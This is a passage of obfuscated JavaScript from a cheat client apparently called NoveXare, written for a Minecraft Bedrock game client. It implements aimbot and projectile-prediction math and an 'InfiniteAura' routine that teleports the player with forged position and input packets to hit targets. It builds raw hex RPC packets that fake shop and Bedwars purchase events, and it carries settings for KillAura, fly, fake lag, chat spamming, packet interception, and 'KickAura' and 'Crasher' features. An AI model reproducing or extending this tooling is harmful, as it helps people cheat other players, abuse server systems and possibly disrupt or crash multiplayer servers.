    _0x24b8e0.crosshair = Math.sqrt(_0x1c7163 * _0x1c7163 + _0x192ef2 * _0x192ef2);
    _0x24b8e0.items = _0x304561;
    _0x24b8e0.random = getRandomNum(0, _0x5e7e58.length - 1);
    _0x47ec84.push(_0x24b8e0);
  }
  const _0x2a9367 = [(_0x4337fb, _0x3d4530) => _0x4337fb.distance - _0x3d4530.distance, (_0x5c3a7c, _0x4deb0d) => _0x5c3a7c.heal - _0x4deb0d.heal, (_0x42fabd, _0x1399b9) => _0x42fabd.damage - _0x1399b9.damage, (_0x29bdb4, _0x23efd1) => _0x29bdb4.crosshair - _0x23efd1.crosshair, (_0xd5e53c, _0xeec096) => _0xeec096.items - _0xd5e53c.items, (_0x31aa26, _0x3d40bb) => _0x31aa26.random - _0x3d40bb.random];
  _0x47ec84.sort(_0x2a9367[func_mode.select_mode]);
  if (reverse_target) {
    _0x47ec84.reverse();
  }
  return _0x47ec84.slice(0, _0x2d4b82).map(_0x534c4a => _0x534c4a.target_id);
};
const getDistance = (_0x21b560, _0x47d2a2) => Math.sqrt(Math.pow(_0x21b560.x - _0x47d2a2.x, 2) + Math.pow(_0x21b560.y - _0x47d2a2.y, 2) + Math.pow(_0x21b560.z - _0x47d2a2.z, 2));
const getDistanceByID = (_0x179246, _0x1bf344) => {
  const _0x50550c = getEntityPos(_0x179246);
  const _0x55184f = getEntityPos(_0x1bf344);
  return Math.sqrt(Math.pow(_0x50550c.x - _0x55184f.x, 2) + Math.pow(_0x50550c.y - _0x55184f.y, 2) + Math.pow(_0x50550c.z - _0x55184f.z, 2));
};
const getHorizontalDistanceByID = (_0x375c13, _0x463357) => {
  const _0x449eeb = getEntityPos(_0x375c13);
  const _0x25386b = getEntityPos(_0x463357);
  return Math.sqrt(Math.pow(_0x449eeb.x - _0x25386b.x, 2) + Math.pow(_0x449eeb.z - _0x25386b.z, 2));
};
const MenuTP = (_0x4c8f06, _0x2c1054, _0x3af679) => {
  var _0x49b055 = {
    value: "set_pos",
    x: _0x4c8f06,
    y: _0x2c1054,
    z: _0x3af679
  };
  let _0xd62e1d = _0x49b055;
  callModule(5, JSON.stringify(_0xd62e1d));
};
const getHorizontalDistance = (_0x1f4e90, _0x574fb8) => Math.sqrt(Math.pow(_0x1f4e90.x - _0x574fb8.x, 2) + Math.pow(_0x1f4e90.z - _0x574fb8.z, 2));
const setPos = (_0x2c664d, _0x329400, _0x12fabb) => setEntityPos(self_id, _0x2c664d, _0x329400, _0x12fabb);
const setMotion = (_0x367a3d, _0x2090f8, _0x43e82d) => setEntityMotion(self_id, _0x367a3d, _0x2090f8, _0x43e82d);
const str2obj = _0x460acd => {
  if (_0x460acd === "") {
    return [];
  }
  if (!_0x460acd.includes(",")) {
    return [_0x460acd];
  } else {
    return _0x460acd.split(",");
  }
};
const obj2str = _0x46ba75 => {
  if (typeof _0x46ba75 != "object" || _0x46ba75.length == 0) {
    return "";
  }
  if (_0x46ba75.length == 1) {
    return _0x46ba75[0];
  } else {
    return _0x46ba75.join(",");
  }
};
const EditValue = (_0x682ba2, _0x4b5082) => {
  var _0x52a93a = typeof _0x4b5082 == "object" ? obj2str(_0x4b5082) : _0x4b5082;
  var _0x127472 = typeof _0x4b5082 == "object" ? 0 : 1;
  addForm("{\"type\":\"custom_form\",\"title\":\"编辑变量\",\"content\":[{\"type\":\"input\",\"text\":\"" + _0x682ba2 + "\",\"placeholder\":\"\",\"default\":\"" + _0x52a93a + "\"}]}", function (_0x46130d) {
    if (_0x127472 == 1) {
      globalThis[_0x682ba2] = _0x46130d;
      if (FuncTip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r SetValue §7>>>§r " + _0x682ba2 + " §7>>>§r " + _0x46130d);
      }
    }
    if (_0x127472 == 0) {
      globalThis[_0x682ba2] = str2obj(_0x46130d);
      if (FuncTip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r SetValue §7>>>§r " + _0x682ba2 + " §7>>>§r " + _0x46130d);
      }
    }
    NoveXare_Config[_0x682ba2] = globalThis[_0x682ba2];
  });
};
const getTeams = _0x433ea1 => {
  if (typeof _0x433ea1 != "string" || _0x433ea1 == "") {
    return "None";
  }
  let _0x213df2 = _0x433ea1.match(/\[(.*?)\]/g);
  if (_0x213df2 == null) {
    return "None";
  }
  return _0x213df2[0];
};
const readFile = _0x40086a => {
  const _0x4c2747 = read_file(_0x40086a);
  if (_0x4c2747 == "") {
    return "{}";
  } else {
    return _0x4c2747;
  }
};
const getPlayerBlockPos = _0x2da13f => {
  const _0x144eea = getEntityPos(_0x2da13f);
  let _0x406413 = _0x2da13f == self_id ? Math.floor(_0x144eea.y) - 1 : Math.floor(_0x144eea.y);
  var _0x1c8803 = {};
  _0x1c8803.x = Math.floor(_0x144eea.x);
  _0x1c8803.y = _0x406413;
  _0x1c8803.z = Math.floor(_0x144eea.z);
  return _0x1c8803;
};
const subtraction = (_0x413f13, _0x3d1fe6) => {
  if (_0x413f13.length == _0x3d1fe6.length) {
    return [];
  }
  let _0x5b13fa = _0x413f13.length >= _0x3d1fe6.length ? _0x413f13 : _0x3d1fe6;
  let _0x3cf6ce = _0x413f13.length < _0x3d1fe6.length ? _0x413f13 : _0x3d1fe6;
  let _0x3a8115 = [];
  for (let _0xe49302 of _0x5b13fa) {
    if (!_0x3cf6ce.includes(_0xe49302)) {
      _0x3a8115.push(_0xe49302);
    }
  }
  return _0x3a8115;
};
const calculateLaunchAngle = (_0x2650eb, _0x392be5) => {
  const _0x74ca7e = AssistAim_speed;
  const _0x927c50 = AssistAim_gravity;
  const _0x3faca9 = Math.atan((Math.pow(_0x74ca7e, 2) - Math.sqrt(Math.pow(_0x74ca7e, 4) - _0x927c50 * (_0x927c50 * Math.pow(_0x2650eb, 2) + _0x392be5 * 2 * Math.pow(_0x74ca7e, 2)))) / (_0x927c50 * _0x2650eb));
  const _0x7c77c4 = _0x3faca9 * 180 / Math.PI;
  return _0x7c77c4;
};
const getArrowFlyTime = (_0x319c54, _0x2da068, _0x2aa524, _0x597568) => {
  let _0x3fcb78 = _0x2aa524 > 0;
  let _0x55a0fa = Math.abs(_0x2aa524) * Math.PI / 180;
  let _0x3cacdf = Math.cos(_0x55a0fa) * _0x2da068;
  let _0x5b419c = _0x3cacdf / AssistAim_gravity;
  let _0x5bb629 = Math.sqrt(_0x597568 * 2 / AssistAim_gravity);
  let _0x44e7b4 = _0x3fcb78 ? _0x5bb629 : _0x5bb629 + _0x5b419c;
  return _0x44e7b4;
};
const getPlayerAngle = (_0x272404, _0xf30bec, _0x121c7b, _0x4a2035 = false, _0x169eea = false, _0xeb2b06 = 0, _0x561408 = 0) => {
  let _0x5b1ac4 = typeof _0xf30bec != "string" ? _0xf30bec : getEntityPos(_0xf30bec);
  let _0x35fe0d = typeof _0x272404 != "string" ? _0x272404 : getEntityPos(_0x272404);
  let _0x45a974 = getEntityRot(_0x272404);
  const _0x182b08 = getHorizontalDistance(_0x35fe0d, _0x5b1ac4);
  if (_0x4a2035) {
    _0x5b1ac4 = predictEntityPos(getEntityMotion(_0xf30bec), getEntityPos(_0xf30bec), getArrowFlyTime(_0x182b08, AssistAim_speed, _0x45a974.pitch, -_0x35fe0d.y + _0x5b1ac4.y) * 20);
  }
  let _0x158ad9 = getEntitySize(_0xf30bec);
  let _0x4384fb = _0x5b1ac4.x - _0x35fe0d.x;
  let _0x115acf = _0x35fe0d.y - _0x5b1ac4.y + (AssistAim_y - 20) / 10 + getRandomNum(0, _0x561408) / 10;
  let _0x128ed4 = _0x5b1ac4.z - _0x35fe0d.z;
  let _0x4a80b3 = Math.atan2(_0x128ed4, _0x4384fb) * 180 / Math.PI;
  let _0x1f033c = _0x169eea ? _0x47e01d : Math.atan2(_0x115acf, _0x182b08) * 180 / Math.PI;
  const _0x47e01d = calculateLaunchAngle(_0x182b08, _0x115acf);
  if (_0x121c7b == "yaw_pos") {
    if (_0x4a80b3 > -180 && _0x4a80b3 <= 90) {
      return _0x4a80b3 + 90;
    } else {
      return _0x4a80b3 - 270;
    }
  }
  if (_0x121c7b == "yaw_rot") {
    _0x4a80b3 = _0x4a80b3 > -180 && _0x4a80b3 <= 90 ? _0x4a80b3 + 90 : _0x4a80b3 - 270;
    let _0x4cc57f = _0x4a80b3 - _0x45a974.yaw + getRandomNum(-_0xeb2b06 / 2, _0xeb2b06 / 2);
    if (_0x4cc57f > 0) {
      return -_0x4cc57f + 180;
    } else {
      return -_0x4cc57f - 180;
    }
  }
  if (_0x121c7b == "pitch_pos") {
    return _0x1f033c;
  }
  if (_0x121c7b == "pitch_rot") {
    return _0x1f033c - _0x45a974.pitch;
  }
};
const isAimed = (_0x274dd7, _0x326bd6, _0x18a7a7, _0x55b50b) => {
  let _0x10634e = Math.abs(getPlayerAngle(_0x274dd7, _0x326bd6, "yaw_rot"));
  let _0x1ba9d2 = Math.abs(getPlayerAngle(_0x274dd7, _0x326bd6, "pitch_rot"));
  if (_0x55b50b == 0) {
    return Math.sqrt(_0x10634e * _0x10634e + _0x1ba9d2 * _0x1ba9d2) < _0x18a7a7;
  }
  if (_0x55b50b == 1) {
    return Math.abs(_0x10634e) < _0x18a7a7;
  }
  if (_0x55b50b == 2) {
    return Math.abs(_0x1ba9d2) < _0x18a7a7;
  }
};
const tphit = _0x67d58c => {
  if (!InfiniteAura_backPos || target_list.length == 0) {
    return;
  }
  const _0x1fa730 = predictEntityPos(getEntityMotion(_0x67d58c), getEntityPos(_0x67d58c), 1);
  const _0x46ac54 = InfiniteAura_random ? getRandomNum(-2, 2) : 0;
  var _0x2c57a6 = {
    value: "set_pos",
    x: _0x1fa730.x + _0x46ac54,
    y: _0x1fa730.y + InfiniteAura_yoffset / 5,
    z: _0x1fa730.z + _0x46ac54
  };
  let _0x472b43 = _0x2c57a6;
  if (func_mode.InfiniteAura_mode == 0) {
    setPos(_0x1fa730.x + _0x46ac54, _0x1fa730.y + InfiniteAura_yoffset / 5, _0x1fa730.z + _0x46ac54);
  }
  if (func_mode.InfiniteAura_mode == 1) {
    setMotion(_0x1fa730.x + _0x46ac54 - InfiniteAura_backPos.x, _0x1fa730.y + InfiniteAura_yoffset / 5, _0x1fa730.z + _0x46ac54 - InfiniteAura_backPos.z);
  }
  if (func_mode.InfiniteAura_mode == 2) {
    executePluginCommand("/ww tp " + _0x472b43.x + " " + _0x472b43.y + " " + _0x472b43.z);
  }
  if (func_mode.InfiniteAura_mode == 3) {
    callModule(5, JSON.stringify(_0x472b43));
  }
  if (func_mode.InfiniteAura_mode == 4) {
    sendPlayerAuthInput({
      pos: {
        x: _0x1fa730.x + _0x46ac54,
        y: _0x1fa730.y + InfiniteAura_yoffset / 5,
        z: _0x1fa730.z + _0x46ac54
      },
      inputMode: 2,
      playMode: 0,
      rot: {
        pitch: 0,
        yaw: 0
      },
      motion: getEntityMotion(self_id),
      yHeadRot: 0
    });
  }
  if (InfiniteAura_click) {
    buildBlock(self_id, _0x1fa730.x + _0x46ac54, _0x1fa730.y, _0x1fa730.z + _0x46ac54, 1);
    if (func_mode.InfiniteAura_mode == 4) {
      sendPlayerAuthInput({
        pos: {
          x: _0x1fa730.x + _0x46ac54,
          y: _0x1fa730.y + InfiniteAura_yoffset / 5,
          z: _0x1fa730.z + _0x46ac54
        },
        inputMode: 2,
        playMode: 0,
        actions: [{
          pos: {
            x: _0x1fa730.x + _0x46ac54,
            y: _0x1fa730.y + InfiniteAura_yoffset / 5,
            z: _0x1fa730.z + _0x46ac54
          },
          value: 1,
          type: 25
        }]
      });
    }
  }
  if (InfiniteAura_amove) {
    setMotion(0, 0.42, 0);
  }
  InfiniteAura_num_r--;
};
const hexToString = _0x384e43 => {
  let _0x10d279 = "";
  for (let _0xc47691 = 0; _0xc47691 < _0x384e43.length; _0xc47691 += 2) {
    _0x10d279 += String.fromCharCode(parseInt(_0x384e43.substr(_0xc47691, 2), 16));
  }
  return _0x10d279;
};
const findPath = (_0x2046cd, _0x5e45f0, _0x1dde37 = 0.5) => {
  let _0x10498f = [];
  let _0x10e218 = getPlayerAngle(_0x2046cd, _0x5e45f0, "yaw_pos");
  let _0x47de55 = getPlayerAngle(_0x2046cd, _0x5e45f0, "pitch_pos");
  for (let _0x283075 = 0; _0x283075 < getDistance(_0x2046cd, _0x5e45f0); _0x283075 += _0x1dde37) {
    var _0x4bf3e = {
      yaw: _0x10e218,
      pitch: -_0x47de55
    };
    let _0x5d51ae = getDisplacement(-_0x283075, _0x2046cd, _0x4bf3e);
    var _0x335735 = {};
    _0x335735.x = Math.round(_0x5d51ae.x);
    _0x335735.y = Math.round(_0x5d51ae.y);
    _0x335735.z = Math.round(_0x5d51ae.z);
    _0x10498f.push(_0x335735);
  }
  return _0x10498f;
};
const stringToHex = _0x4b4ca2 => {
  let _0x2d01ef = "";
  for (let _0x16c397 = 0; _0x16c397 < _0x4b4ca2.length; _0x16c397++) {
    _0x2d01ef += _0x4b4ca2.charCodeAt(_0x16c397).toString(16);
  }
  return _0x2d01ef;
};
const getHealth = (_0x47795d, _0x249e27) => {
  var _0x6630ef = getEntityAttribute(_0x47795d, "minecraft:health");
  var _0x39f9c8 = _0x6630ef.current;
  var _0x5148a9 = _0x6630ef.max;
  const _0x1de32f = _0x39f9c8 / _0x5148a9;
  switch (_0x249e27) {
    case 0:
      return _0x1de32f.toFixed(2) * 100 + "%%";
    case 1:
      let _0x2cf1c1 = "§c";
      for (let _0x46b0f0 = 0; _0x46b0f0 < Math.floor(_0x1de32f * 20); _0x46b0f0++) {
        _0x2cf1c1 += "❤";
      }
      return _0x2cf1c1 + "§r";
    case 2:
      return "§c❤§rx" + Math.floor(_0x39f9c8);
    case 3:
      return Math.floor(_0x39f9c8) + "/" + Math.floor(_0x5148a9);
    default:
      return _0x39f9c8;
  }
};
const addTP = (_0x9438f9, _0x18a127, _0x4ac182, _0x5ac094) => {
  const _0x40af8e = getEntityPos(self_id);
  for (let _0x53a46c = 0; _0x53a46c < _0x5ac094; _0x53a46c++) {
    tp_list.push([_0x9438f9, _0x18a127, _0x4ac182]);
    tp_list.push([_0x40af8e.x, _0x40af8e.y, _0x40af8e.z]);
  }
};
const randomStr = _0x1ac57c => {
  var _0x2dd6d5 = "";
  for (let _0x465762 = 0; _0x465762 < _0x1ac57c; _0x465762++) {
    const _0x22be48 = getRandomNum(0, 5);
    if (_0x22be48 == 0) {
      _0x2dd6d5 += "?";
    }
    if (_0x22be48 == 1) {
      _0x2dd6d5 += "!";
    }
    if (_0x22be48 == 2) {
      _0x2dd6d5 += "/";
    }
    if (_0x22be48 == 2) {
      _0x2dd6d5 += "\\";
    }
    if (_0x22be48 == 2) {
      _0x2dd6d5 += "$";
    }
  }
  return _0x2dd6d5;
};
const formatHex = _0x217a91 => _0x217a91.replace(/\s+/g, "").toLowerCase();
const combineBuyPacket = (_0x1f1119, _0x55da8d) => {
  const _0x250fbe = stringToHex("ModEventC2S");
  const _0x26141a = stringToHex("HYTShopMod");
  const _0xd1ade0 = stringToHex("good" + _0x55da8d);
  const _0x1e41c4 = stringToHex("page" + _0x1f1119);
  const _0xd4a0f0 = "93 C4 0B" + _0x250fbe + "94 C4 0A" + _0x26141a + "C4 16 48 59 54 53 68 6F 70 4D 6F 64 43 6C 69 65 6E 74 53 79 73 74 65 6D C4 0C 42 75 79 47 6F 6F 64 45 76 65 6E 74 82 C4 04 67 6F 6F 64 C4 05" + _0xd1ade0 + "C4 04 70 61 67 65 C4 05" + _0x1e41c4 + "C0";
  return formatHex(_0xd4a0f0);
};
const HYTShopMod = (_0x1f9a3b = "1", _0x5b4645 = "1") => sendRpc(98247598, combineBuyPacket(_0x1f9a3b, _0x5b4645));
const stringToUtf8Hex = _0x1e8954 => {
  let _0x4caa39 = "";
  for (let _0x1e1d8a = 0; _0x1e1d8a < _0x1e8954.length; _0x1e1d8a++) {
    let _0x55506c = _0x1e8954.charCodeAt(_0x1e1d8a);
    if (_0x55506c < 128) {
      _0x4caa39 += _0x55506c.toString(16).padStart(2, "0");
    } else if (_0x55506c < 2048) {
      _0x4caa39 += (_0x55506c >> 6 | 192).toString(16).padStart(2, "0");
      _0x4caa39 += (_0x55506c & 63 | 128).toString(16).padStart(2, "0");
    } else if (_0x55506c < 55296 || _0x55506c >= 57344) {
      _0x4caa39 += (_0x55506c >> 12 | 224).toString(16).padStart(2, "0");
      _0x4caa39 += (_0x55506c >> 6 & 63 | 128).toString(16).padStart(2, "0");
      _0x4caa39 += (_0x55506c & 63 | 128).toString(16).padStart(2, "0");
    } else {
      _0x1e1d8a++;
      _0x55506c = 65536 + ((_0x55506c & 1023) << 10) | _0x1e8954.charCodeAt(_0x1e1d8a) & 1023;
      _0x4caa39 += (_0x55506c >> 18 | 240).toString(16).padStart(2, "0");
      _0x4caa39 += (_0x55506c >> 12 & 63 | 128).toString(16).padStart(2, "0");
      _0x4caa39 += (_0x55506c >> 6 & 63 | 128).toString(16).padStart(2, "0");
      _0x4caa39 += (_0x55506c & 63 | 128).toString(16).padStart(2, "0");
    }
  }
  return _0x4caa39;
};
const indexToHex = _0x21539c => _0x21539c.toString(16).padStart(2, "0");
const ModuleDestroy = _0x17483a => {
  _0x3c1234: for (let _0x4c9b96 = Math.ceil(-destroy_size / 2); _0x4c9b96 < Math.floor(destroy_size / 2 + 1); _0x4c9b96++) {
    for (let _0xcf980 = Math.ceil(-destroy_size / 2); _0xcf980 < Math.floor(destroy_size / 2 + 1); _0xcf980++) {
      for (let _0x47c590 = Math.ceil(-destroy_size / 2); _0x47c590 < Math.floor(destroy_size / 2 + 1); _0x47c590++) {
        if (excludeFeet && _0x17483a.y + _0xcf980 <= _0x17483a.y - 1) {
          continue _0x3c1234;
        }
        if (replace_block) {
          setBlock(x + _0x4c9b96, y + _0xcf980, z + _0x47c590, "minecraft:air", 0);
        }
        if (!replace_block) {
          destroyBlock(self_id, _0x17483a.x + _0x4c9b96, _0x17483a.y + _0xcf980, _0x17483a.z + _0x47c590, 0);
        }
        if (destroy_packet) {
          destroyPacket(_0x17483a.x + _0x4c9b96, _0x17483a.y + _0xcf980, _0x17483a.z + _0x47c590, true, true);
        }
      }
    }
  }
};
const HexToFormat = _0x459063 => {
  let _0x35ec0c = "";
  let _0x11d610 = _0x459063.split("");
  for (let _0x582360 in _0x11d610) {
    let _0x1d4d81 = _0x11d610[_0x582360].toUpperCase();
    if (_0x582360 != _0x11d610.length - 1) {
      if (_0x582360 % 2 == 1) {
        _0x35ec0c += _0x1d4d81 + " ";
      } else {
        _0x35ec0c += _0x1d4d81;
      }
    } else {
      _0x35ec0c += _0x1d4d81;
    }
  }
  if (remark_hex) {
    let _0x50cad1 = _0x35ec0c.split(" ");
    let _0x57a23e = "";
    for (let _0x511664 in _0x50cad1) {
      _0x57a23e += _0x50cad1[_0x511664] + "(" + hexToString(_0x50cad1[_0x511664]) + ") ";
    }
    return _0x57a23e;
  } else {
    return _0x35ec0c;
  }
};
const setTarget = (_0x5f475f, _0x3d6a25, _0x4ad989 = false) => {
  setEntityTarget(_0x5f475f, _0x3d6a25);
  if (_0x4ad989) {
    setEntityTarget(_0x3d6a25, _0x5f475f);
  }
};
const BJD_NBedwarsBuyItemEvent = (_0x4d88cc = "方块", _0x7f57ed = 0) => {
  const _0x80f423 = "93 C4 0B" + stringToHex("ModEventC2S") + "94 C4 08 48 75 64 41 64 64 6F 6E C4 14";
  const _0xabefd3 = stringToHex("HudAddonClientSystem") + "C4 14";
  const _0x371923 = stringToHex("NBedwarsBuyItemEvent") + "82 C4 04 73 68 6F 70 C4 ";
  const _0x543196 = stringToUtf8Hex(_0x4d88cc);
  const _0x2145e2 = (_0x543196.length / 2).toString(16).padStart(2, "0");
  const _0x20fdb7 = _0x80f423 + _0xabefd3 + _0x371923 + _0x2145e2 + _0x543196 + "C4 05 69 6E 64 65 78" + indexToHex(_0x7f57ed) + "C0";
  sendRpc(98247598, formatHex(_0x20fdb7));
};
var packetlist = {
  send: {},
  receive: {}
};
var key_bind_list = [];
const resList = ["minecraft:iron_ingot", "minecraft:diamond", "minecraft:gold_ingot", "minecraft:emerald"];
var bind_func = {};
var cleaner_path = getResource() + "/NoveXare/Cleaner.json";
var NoveXare_path = getResource() + "/NoveXare";
const ArrayListCfg = JSON.parse(readFile(NoveXare_path + "/FuncArrayList.json"));
const {
  SmartInvCfg,
  move_armor_slot
} = JSON.parse(readFile(NoveXare_path + "/SmartInv.json"));
var config_path = getResource() + "/NX_Config";
var current_ui = JSON.parse(readFile(getResource() + "/ui/ui_definition.json"));
var tp_list = [];
var motion_list = [];
var temp_pos = {
  x: 0,
  y: 0,
  z: 0
};
var chest_pos = [];
var destroy_list = [];
var isDestroy = false;
var destroy_namespace = null;
var drop_list = [];
var sound_file = null;
var surround_all_entity = false;
var other_user = null;
var lag_last_tick = 1;
var tickCounter = 0;
let f_jump = false;
var default_size = {
  x: 0.6,
  y: 1.8
};
var temp_size = {
  x: 0.6,
  y: 1.8
};
var debuff = [2, 4, 7, 9, 15, 17, 18, 19, 20, 27, 31, 33];
var self_id = getUserID(other_user);
var last_tick_id = getUserID(other_user);
var last_tick_heal = 20;
var last_tick_pos = getEntityPos(self_id);
var last_world_player = [];
let gm_pos = {};
let gm_mot = {};
var Scaffold_pitch = false;
var Scaffold_Force = false;
var Scaffold_self = false;
var Scaffold_other = false;
var Scaffold_person = false;
var Scaffold_aim_pos = null;
var regex = ["player", "entity", "主城", "商店", "[LV", "CIT-", "ˉ", "－", "%", "-", "%"];
var keyword = ["kick", "movemcpkick", "rank", "music", "setcan"];
var SoundPlayer_vec = 1;
var surround_exclude_self = false;
var keyword2 = [];
var send_keyword = ["pongggg", "clicked"];
var send_keyword2 = [];
var receive_keyword = [];
var receive_keyword2 = [];
var {
  clear_config,
  trash_slot
} = JSON.parse(readFile(cleaner_path));
const temp = clear_config.map(_0x24bd9c => _0x24bd9c.namespace);
var last_bps = 0;
var lasttick_mot_y = 0;
var freecam_pos = {};
var Camera_anchor_pos = {
  x: 0,
  y: 0,
  z: 0
};
var fakemove_pos = {};
var AvoidAttack_pos = {};
var Scaffold_bjd = false;
var Scaffold_any = false;
var armor_slot = 0;
var rpc_t = 0;
var shift_tick_r = 0;
var shift_tick = 0;
var shift_num = 100;
var self_pos = {
  x: 0,
  y: 0,
  z: 0
};
var replace_block = false;
var KillAura_empty = 0;
var KillAura_cps_delay = 0;
var sound_data = [];
var goto_pos = null;
var mini_title = false;
var SoundPlayer_num = 1;
const color_list = {};
const color = ["[白]", "[橙]", "None", "None", "[黄]", "[绿]", "None", "None", "None", "[青]", "[紫]", "[蓝]", "None", "None", "[红]", "None"];
var kills = 0;
var seconds = 0;
var ticks = 0;
var lag_t = 0;
var BlockClicker = false;
var block_ac_select = false;
const rgb_color = "4c6e2a3b195d591b3a2e6c4".split("");
var rgb_l = 0;
var rgb_t = 0;
var rgb_cycle = 2;
var Edit_Y = 85;
var isBlockin = false;
var tp_back = true;
var gm_local = false;
var t_c = 0;
var t_b = 0;
var jump_length = 5;
var jump_heigh = 42;
var arrow_rot = {};
var SoundPlayer_yaw = -180;
var select_slot = 0;
var last_PyRpc = {};
var again_item = ["easecation:all_games", "minecraft:emerald"];
var boostSpeed = false;
var AutoBuy_block = false;
var AutoBuy_block_count = 3;
var AutoBuy_apple_count = 3;
var AutoBuy_sword = false;
var AutoBuy_armor = false;
var AutoBuy_enchant = false;
var AutoBuy_apple = false;
var RepeatRpc_times = 1;
var entity_keyword = [];
var RunAway_binds = [];
var check_hide = true;
var AssistAim_precision = 1;
var ap_autobag = false;
var item_count = 0;
var lasttick_item_count = 0;
var last_item_data = {
  nbt: null,
  object: null
};
var hasBrought = {
  enchant: {
    sharp: 0,
    protect: 0
  },
  armor: 0
};
var default_speed = 1.5;
var edit_suffix = "This is a suffix";
var NoveXare_Config = {
  binds: {},
  key_binds: [],
  RunAway_binds: []
};
const kill_sound = ["https://attachment.0sm.com/node0/2024/07/86682D1EDB81719D-e524f3745f6c619b.mp3", "https://attachment.0sm.com/node0/2024/07/86682D7831609ED7-4055b200951a5147.mp3", "https://attachment.0sm.com/node0/2024/07/86682D7A81A1906F-cd892d409a750b42.mp3", "https://attachment.0sm.com/node0/2024/07/86682D7C8813F73F-ff10702dfda6616f.mp3", "https://attachment.0sm.com/node0/2024/07/86682D80F096B777-ba851e9a4806f8af.mp3", "https://attachment.0sm.com/node0/2024/07/86682D7E5837BA97-d057eabbc9100ea1.mp3"];
const kill_tip = ["重重一击", "两连击", "三连击", "非常犀利", "无人能挡", "主宰比赛", "迈向超神", "正在暴走", "如神一般", "已经超神"];
var neglect_exclude = false;
var rocker_bhop_heigh = 0.42;
var line_particle_offset = 0;
var line_particle_type = 3;
var line_particle_size = 1;
var avoid_remove = false;
var aim_attack_cps = 10;
var aim_attack_fov = 15;
var aim_attack_use = false;
var aim_t0 = -Infinity;
var aim_t1 = 0;
var Rider_random = false;
var isOpenChest = false;
var Rider_heigh = 1;
var ac_pos = [];
var AttackSwing = true;
var func_mode = {};
var target_list = [];
var white_list = [];
var max_target_num = 3;
var max_distance = 6;
var min_distance = 0;
var includeMob = false;
var includePlayer = true;
var limit_y = 255;
var limit_min_y = 0;
var fakelag_status = false;
var NoHeigh = false;
var infinite_distance = false;
var check_size = true;
var check_rot = true;
var check_health = true;
var bypass_bjd = true;
var gradual_up = true;
var show_no_intercept = false;
var show_intercept = false;
var whilelist_range = 6;
func_mode.select_mode = 0;
func_mode.nofall_mode = 0;
func_mode.gg_mode = 0;
var surround_particle_heigh = 0;
var surround_particle_length = 0;
var particle_surround_speed = 5;
var bhop_heigh = 0.42;
var KillAura_boost = 1;
var KillAura_Balance = false;
var KillAura_max_cps = 10;
var KillAura_min_cps = 10;
var KillAura_Fov = 90;
var KillAura_distance = 4;
var KillAura_infinite = false;
var KillAura_d_1 = [];
var KillAura_d_2 = [];
var KillAura_auto_close = true;
var KillAura_crit = false;
var KillAura_person = false;
var AttackPacket = false;
var bhop_speed = 5;
func_mode.bhop_mode = 0;
var bhop_airjump = false;
var record_speed = {};
var record_water = {};
var record_lava = {};
var gm_tick = 0;
var gm_move = false;
var gm_ground = false;
var InfiniteAura_random = false;
var InfiniteAura_packet = 3;
var InfiniteAura_backY = false;
var InfiniteAura_amove = false;
var InfiniteAura_distance = 100;
var InfiniteAura_move = 1;
var InfiniteAura_delay = 1;
var InfiniteAura_repeat = true;
var min_run_heal = 10;
func_mode.low_health_operate_mode = 0;
func_mode.person_mode = 0;
var AssistAim_min_speed = 20;
var AssistAim_max_speed = 20;
var AssistAim_predict = false;
var AssistAim_auto = false;
var AssistAim_lock = false;
var AssistAim_distance = 5;
var AssistAim_Fov = 90;
var AssistAim_random_y = 0;
var AssistAim_random_xz = 0;
var AssistAim_speed = 100;
var AssistAim_gravity = 16;
var AssistAim_test = false;
var AssistAim_throw = false;
var AssistAim_other = false;
var AssistAim_self = false;
var AssistAim_y = 0;
var surround_loop = false;
func_mode.AssistAim_mode = 1;
func_mode.pyrpc_mode = 0;
var LockBehind_length = 3;
var LockBehind_heigh = 2;
var LockBehind_yaw = -180;
var surround_particle_yaw = -180;
var surround_speed = 5;
var SoundPlayer_distance = 5;
var max_drop_item = 36;
var drop_delay = 0;
var drop_delay_t = 0;
var sprint_speed = 5;
var sprint_horizontal = false;
var sprint_packet = false;
var Trace_min_dis = 5;
var play_pos_list = [];
var Trace_speed = 5;
var team = "NoveXare";
var fly_speed = 15;
var fly_run = false;
var fly_packet = false;
var fly_mot = true;
var fly_includeY = false;
var fly_up_down = false;
var fly_set_ud = 10;
var fly_ud = 1;
var fly_block = false;
var text = "Lmao";
var chat_keyword = [];
var tip_keyword = ["refresh", "player", "unload", "upload", "vip", "music", "textboard", "scoreboard", "start", "condition"];
var Sucker_dis = 3;
var slowdown_speed = 5;
var KeepDistance_distance = 3;
var KeepDistance_only_ground = false;
var KeepDistance_speed = 5;
var KickAura_times = 500;
var Crasher_times = 500;
var KickAura_multi = true;
var Crasher_multi = true;
var KickAura_for = 50;
var Crasher_for = 50;
func_mode.Crasher_mode = 0;
var Scaffold_length = 1;
var Scaffold_height = 5;
var Scaffold_mode = false;
var Scaffold_block = 1;
var block_namespace = "minecraft:wool";
var Scaffold_hyt = false;
var Scaffold_move = false;
var Scaffold_up = false;
var Scaffold_auto_block = false;
var Scaffold_findPath = false;
var Scaffold_CurrentSlot = -1;
var Scaffold_BlockSlot = -1;
var Scaffold_HasSelected = false;
var Scaffold_HasReceived = false;
var HitBox_x = 2;
var HitBox_y = 1.8;
func_mode.cleaner_mode = 0;
func_mode.health_mode = 0;
var blurred_match = false;
var keep_y = false;
var rec_y = 0;
var InfiniteAura_back = true;
var InfiniteAura_switch_delay = 1;
var InfiniteAura_switch_delay_r = 0;
var InfiniteAura_list = [];
var InfiniteAura_target = [];
var InfiniteAura_tick = 2;
var tick = 0;
var move_tick = 0;
var InfiniteAura_num = 1;
var InfiniteAura_num_r = 0;
func_mode.InfiniteAura_mode = 4;
func_mode.server_mode = 1;
func_mode.FakeLag_mode = 0;
func_mode.hyt_mode = 0;
func_mode.draw_mode = 0;
var InfiniteAura_backPos = null;
var InfiniteAura_backMotion = null;
func_mode.fly_mode = 0;
func_mode.sprint_mode = 0;
var CPvP = false;
func_mode.cpvp_mode = 0;
var throw_wall = false;
var fly_only_fly = false;
var longjump_x = 5;
var longjump_y = 0.5;
var lagback_pos = [];
var lagback_run = false;
var lagback_y = 0.8;
var lagback_derp = false;
var circulateSender = false;
var RepeatRpc_ticks = 1;
var CustomKB_x = 1;
var CustomKB_y = 0.5;
var packet_send = true;
var packet_receive = false;
var packet_tip = false;
var packet_record = false;
var show_pyrpc_id = true;
var content = "NoveXare YYDS";
var Spammer_delay = 1;
var Spammer_random = false;
var Spammer_word = false;
